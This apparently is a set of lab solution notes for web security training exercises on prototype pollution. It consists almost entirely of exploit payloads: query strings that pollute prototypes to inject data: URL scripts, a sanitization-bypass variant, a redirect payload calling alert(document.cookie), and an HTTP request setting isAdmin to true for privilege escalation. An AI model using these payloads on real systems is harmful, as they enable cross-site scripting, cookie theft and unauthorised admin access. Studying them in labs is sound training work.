## 1. Client-side prototype pollution via browser APIs

```
/?__proto__[value]=data:,alert(1);

data:[<media type>][;base64],<data>
```

This will also work `data:application/javascript,alert();`, in script src `application/javascript` is set by default.

## 2. DOM XSS via client-side prototype pollution

```
/?__proto__[transport_url]=data:,alert(1);
```

## 3. DOM XSS via an alternative prototype pollution vector


```
/?__proto__.sequence=);alert(
```

## 4. Client-side prototype pollution via flawed sanitization

```
/?__pro__proto__to__[transport_url]=data:,alert()
```

## 5. Scanning non-standard data structures

```html
<script>
    location="https://0ab600fe04a7f8c88152b16900bb004e.web-security-academy.net/#__proto__[hitCallback]=alert(document.cookie)"
</script>
```


## 6. Privilege escalation via server-side prototype pollution

```
POST /my-account/change-address HTTP/2
Host: 0a770041032ea20f8063b86b004e00b1.web-security-academy.net
Cookie: session=nGHufYaWkCvezfEZYUwGvWrdP6blmQup
Content-Length: 202
Sec-Ch-Ua: "Chromium";v="119", "Not?A_Brand";v="24"
Sec-Ch-Ua-Platform: "Windows"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.199 Safari/537.36
Content-Type: application/json;charset=UTF-8
Accept: */*
Origin: https://0a770041032ea20f8063b86b004e00b1.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a770041032ea20f8063b86b004e00b1.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Accept-Language: ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7
Priority: u=1, i

{"address_line_1":"Wiener HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UK","sessionId":"nGHufYaWkCvezfEZYUwGvWrdP6blmQup",
	"__proto__":{"isAdmin":true}
}
```
